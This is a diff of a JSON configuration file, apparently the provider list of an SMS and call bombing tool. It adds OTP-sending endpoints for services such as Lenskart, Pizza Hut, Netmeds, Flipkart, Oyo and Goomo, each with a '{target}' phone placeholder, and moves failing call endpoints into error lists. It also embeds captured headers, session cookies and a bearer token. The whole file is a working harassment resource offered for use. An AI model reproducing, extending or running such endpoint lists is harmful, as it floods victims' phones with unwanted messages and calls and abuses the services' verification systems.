@@ -1,6 +1,89 @@
 {
     "sms": {
         "91": [
+            
+            {
+                "name":"lenskart",
+                "url":"https://www.ref-r.com/clients/lenskart/smsApi",
+                "headers" : {
+                    "Host": "www.ref-r.com",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
+                    "Accept": "application/json, text/javascript, */*; q=0.01",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "Content-Length": "26",
+                    "DNT": "1",
+                    "Connection": "keep-alive"
+                    },
+
+                "data" : {
+                  "mobile": "{target}",
+                  "submit": "1",
+                  "undefined": ""
+                    }
+
+            },
+            {
+                "name":"pizzahut",
+                "url":"https://m.pizzahut.co.in/api/cart/send-otp",
+                "headers":{
+                    "Host":"m.pizzahut.co.in",
+                    "content-length":"114",
+                    "origin":"https://m.pizzahut.co.in",
+                    "authorization":"Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5pTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4",
+                    "x-source-origin":"PWAFW",
+                    "content-type":"application/json",
+                    "accept":"application/json, text/plain, */*",
+                    "save-data":"on",
+                    "languagecode":"en",
+                    "referer":"https://m.pizzahut.co.in/login",
+                    "accept-encoding":"gzip, deflate, br",
+                    "accept-language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6",
+                    "cookie":"_fbp=fb.2.1559973905081.1516144968",
+                    "cookie":"_gat_UA-37858192-4=1",
+                    "cookie":"_ga-ss=1|UA-37858192-4|https%3A%2F%2Fwww.google.com%2F",
+                    "cookie":"_gid=GA1.3.1666290082.1559973902",
+                    "cookie":"_ga=GA1.3.1893416092.1559973902",
+                    "cookie":"run_fullstory_for_user=full_story_fail",
+                    "cookie":"_gcl_au=1.1.2020385110.1559973902",
+                    "cookie":"AKA_A2=A"
+                    },
+                "data":{
+                    "customer":{
+                        "MobileNo":"{target}",
+                        "UserName":"{target}",
+                        "merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"
+                        }
+                    }
+            },
+            {
+                "name":"netmeds",
+                "url":"https://m.netmeds.com/sociallogin/popup/nmsgetcode/",
+                "method":"POST",
+                "headers": {
+                    "Host": "m.netmeds.com",
+                    "content-length": "76",
+                    "accept": "*/",
+                    "origin": "https://m.netmeds.com",
+                    "x-requested-with": "XMLHttpRequest",
+                    "save-data": "on",
+                    "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "referer": "https://m.netmeds.com/customer/account/login/",
+                    "accept-encoding": "gzip, deflate, br",
+                    "accept-language": "en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6",
+                    "cookie": "_ga=GA1.3.185497001.1558720330"
+                                },
+
+                "data": {
+                  "register_mobileno": "{target}",
+                  "logintype": "Otp",
+                  "uniq_identy": "quWqfunF",
+                  "forget_pwd": "N"
+                        }
+            },
             {
                 "name": "confirmtkt",
                 "method": "GET",
@@ -173,18 +256,88 @@
         ],
         "multi": [
             {
+                "name":"oriyamatrimony",
+                "url":"https://www.oriyamatrimony.com/login/mobileappsms-homepage.php",
+                "method":"POST",
+                "headers" : {
+                        "Accept": "*/*",
+                        "Accept-Encoding": "gzip, deflate, br",
+                        "Accept-Language": "en-US,en;q=0.5",
+                        "Connection": "keep-alive",
+                        "Content-Length": "34",
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Host": "www.oriyamatrimony.com",
+                        "referer": "https://www.oriyamatrimony.com/",
+                        "user-agent": "Mozilla/5.0 (Windows NT 8.1; Win64; x64; rv:59.0) Gecko/20 Firefox/56.0",
+                        "X-Requested-With": "XMLHttpRequest"
+                            },
+
+                "data": {"countrycode": "{cc}", "mobileno": "{target}"}
+            },
+            {
+                "name":"oyorooms",
+                "method":"GET",
+                "url":"https://www.oyorooms.com/api/pwa/generateotp",
+                "data":{
+                    "country_code":"+{cc}",
+                    "phone":"{target}"
+                }
+            },
+            {
+                "name":"goomo",
+                "url":"https://client-api.goomo.com/v2/phone_confirmation/verify_user",
+                "headers" : {
+                    "Host": "client-api.goomo.com",
+                    "origin": "https://www.goomo.com",
+                    "client": "m-web",
+                    "x-goomo-platform": "mWeb",
+                    "dnt": "1",
+                    "content-type": "application/json",
+                    "accept": "*/*",
+                    "referer": "https://www.goomo.com/hotels",
+                    "accept-encoding": "gzip, deflate, br",
+                    "accept-language": "en-US,en;q=0.9"
+                            },
+
+                "data" : {"email":"fakeemail@gmail.com","phone_number":"{target}","country_code":"{cc}"}
+                
+            },
+            {
                 "name": "flipkart",
                 "method": "POST",
-                "cc_target": "loginId",
-                "url": "https://www.flipkart.com/api/5/user/otp/generate",
-                "data": {
-                    "loginId": "+{target}"
-                },
-                "headers": {
-                    "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
-                    "Origin": "https://www.flipkart.com",
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
+                "cookies" : {
+                    "Cookie:T": "BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050",
+                    "SWAB": "build-44be9e47461a74d737914207bcbafc30",
+                    "lux_uid": "155867904381892986",
+                    "AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg": "1",
+                    "AMCV_17EB401053DAF4840A490D4C%40AdobeOrg": "-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI",
+                    "s_cc": "true",
+                    "SN": "2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078",
+                    "gpv_pn": "HomePage",
+                    "gpv_pn_t": "Homepage",
+                    "S": "d1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==",
+                    "s_sq": "%5B%5BB%5D%5D"},
+
+            "headers" : {
+                "Host": "www.flipkart.com",
+                "Connection": "keep-alive",
+                "Content-Length": "60",
+                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop",
+                "Origin": "https://www.flipkart.com",
+                "Save-Data": "on",
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Accept": "*/*",
+                "Referer": "https://www.flipkart.com/",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Accept-Language": "en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
+                        },
+
+            "data" : {
+                  "loginId": "+{cc}{target}",
+                  "state": "VERIFIED",
+                  "churnEmailRequest": false
+                    },
                 "identifier": "emailMask"
             },
             {
@@ -193,7 +346,7 @@
                 "url": "https://api.gotinder.com/v2/auth/sms/send",
                 "params": {
                     "auth_type": "sms",
-                    "locale": "ru"
+                    "locale": "{ncc}"
                 },
                 "data": {
                     "phone_number": "{cc}{target}"
@@ -273,7 +426,7 @@
                 "params": {
                     "number": "{target}",
                     "cc": "{cc}",
-                    "whatsAppOpted": false
+                    "whatsAppOpted": "false"
                 },
                 "identifier": "200"
             }
@@ -281,15 +434,7 @@
     },
     "call": {
         "91": [
-            {
-                "name": "makaan",
-                "method": "GET",
-                "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{target}",
-                "params": {
-                    "callType": "otpOnCall"
-                },
-                "identifier": "2XX"
-            },
+            
             {
                 "name": "realestate",
                 "method": "POST",
@@ -311,15 +456,7 @@
                 },
                 "identifier": "Y"
             },
-            {
-                "name": "magicbricks",
-                "method": "GET",
-                "url": "https://api.magicbricks.com/bricks/verifyOnCall.html",
-                "params": {
-                    "mobile": "{target}"
-                },
-                "identifier": "callmade"
-            },
+            
             {
                 "name": "career360",
                 "method": "POST",
@@ -362,7 +499,15 @@
         "multi": []
     },
     
-        "error":[
+        "error_sms":[
+            {
+                "name":"delhivery",
+                "method":"POST",
+                "url":"https://direct.delhivery.com/delhiverydirect/order/generate-otp",
+                "data":{
+                    "phoneNo":"{target}"
+                }
+            },
             {
                 "name": "porter",
                 "method": "POST",
@@ -495,5 +640,25 @@
                 },
                 "identifier": "200"
             }
-        ]
+        ],
+    "error_call":[
+        {
+                "name": "magicbricks",
+                "method": "GET",
+                "url": "https://api.magicbricks.com/bricks/verifyOnCall.html",
+                "params": {
+                    "mobile": "{target}"
+                },
+                "identifier": "callmade"
+            },
+        {
+                "name": "makaan",
+                "method": "GET",
+                "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{target}",
+                "params": {
+                    "callType": "otpOnCall"
+                },
+                "identifier": "2XX"
+            }
+    ]
 }
